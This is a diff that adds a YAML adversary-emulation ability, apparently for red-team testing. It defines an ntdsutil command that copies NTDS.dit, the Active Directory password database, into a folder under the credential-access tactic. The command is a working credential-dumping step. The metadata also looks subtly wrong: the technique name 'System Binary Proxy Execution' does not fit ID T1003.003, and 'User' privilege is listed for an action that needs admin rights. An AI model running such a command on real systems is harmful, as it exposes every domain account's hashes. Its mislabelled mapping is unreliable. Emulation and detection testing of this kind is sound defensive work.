@@ -1,0 +1,21 @@
+- id: b4cef1ec-678a-9ab5-16b2-43589c3b7028
+  name: ntdsutil.exe - Dump NTDS.dit into folder
+  description: Dump NTDS.dit into folder
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - credential-access
+  version: '1.0'
+  author: Tony Lambert
+  created: '2020-01-10'
+  modified: '2020-01-10'
+  operating_system: Windows All Versions
